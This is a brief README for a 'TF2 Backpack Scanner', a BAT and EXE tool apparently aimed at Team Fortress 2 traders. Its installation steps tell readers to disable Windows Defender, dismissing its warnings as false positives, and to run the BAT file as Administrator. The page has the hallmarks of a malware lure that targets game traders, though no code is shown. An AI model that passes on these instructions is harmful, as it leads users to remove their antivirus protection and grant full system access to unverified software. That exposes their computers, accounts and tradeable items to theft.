# TF2 Backpack Scanner

Hi! I'm Kit, and this is my **TF2 Backpack Scanner**, created to help Team Fortress 2 traders manage and scan their backpacks more easily.

The scanner is provided as both a **.BAT** file and an **.EXE** file for convenience. The installer is designed to automatically install the program into your TF2 game directory.

## Installation & Usage

### Step 1: Disable Windows Defender
Before running the scanner, temporarily disable Windows Defender. The program may generate false-positive security alerts that can interfere with installation or execution.

### Step 2: Run as Administrator
Right-click the **BAT** file and select **Run as Administrator**.

### Step 3: Alternative Launch Method
If the BAT file does not work correctly on your system, try running the included **EXE** file instead.
